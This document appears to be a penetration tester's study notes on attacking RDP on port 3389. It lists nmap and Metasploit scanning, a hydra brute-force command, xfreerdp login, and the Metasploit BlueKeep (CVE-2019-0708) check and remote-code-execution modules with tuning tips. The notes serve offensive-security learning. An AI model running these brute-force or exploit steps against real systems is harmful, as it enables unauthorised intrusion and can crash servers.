TCP port 3389 - check all ports on target, companies change it around a lot for RDP

Requires legitimate credentials to utilize


Authentication
=
- requires user account on target system
- requires users password in clear-txt on the system


Methodology
=
**Gaining credentials and authentication:**
1. scan for RDP with nmap, if weird ports pop up but no RDP, use RDP scanner in `aux/scanner/rdp/rdp_scanner` in msf, companies may have changed ports around
2. Bruteforce RDP with hydra
3. authenticate with xfreerdp

**BlueKeep (kernel memory exploit):**
1. scan system with nmap for RDP
2. use `aux/scanner/rdp/cve_2019_0708_bluekeep` on msf to check target vulnerability
3. use `exploit/windows/rdp/cve_2019_0708_bluekeep_rce` if vuln (only works on 64 bit)
	1. need to manually set windows version `show targets`
	2. if target system is crashing adjust CHUNK grooming size


Metasploit
=
scanning for RDP on particular port:
use `aux/scanner/rdp/rdp_scanner`
	setup
	run


BruteForce
=
`hydra -L userlist.lst -P passlist.lst host_ip rdp -s port` - be careful of dosing the server, may need to reduce task to much lower, default is 16, try 2/3 if issues arise 
	rdp:://ip -s port - alternative


Xfreerdp
=
usage: `xfreedrpd /u:username /p:password /v:target_ip:port`


BlueKeep
=
no official proof of concepts
kernel memory exploit
can crash target
use metasploit for administrative pwn
